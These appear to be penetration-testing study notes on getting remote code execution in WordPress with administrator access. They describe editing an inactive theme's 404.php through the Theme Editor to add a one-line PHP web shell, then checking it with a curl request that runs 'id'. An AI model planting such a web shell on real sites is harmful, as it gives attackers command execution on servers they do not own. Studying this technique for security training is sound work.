
## Attacking the [[Wordpress]] [[Back end]]
With administrative access to WordPress, we can modify the PHP source code to execute system commands. To perform this attack, log in to WordPress with the administrator credentials, which should redirect us to the admin panel. Click on Appearance on the side panel and select Theme Editor. This page will allow us to edit the PHP source code directly. We should select an inactive theme in order to avoid corrupting the main theme.
![[Pasted image 20250130183318.png]]
![[Pasted image 20250130183334.png]]
Choose a theme and click on Select. Next, choose a non-critical file such as 404.php to modify and add a web shell.

```php
<?php

system($_GET['cmd']);

/** The template for 404 pages goes here **/

<snip>
```

We can then validate we achieved the RCE by entering the URL into the web browser or issuing the curl request below:
```
curl -X GET "http://[IP]/wp-content/themes/twentyseventeen/404.php?cmd=id"
```
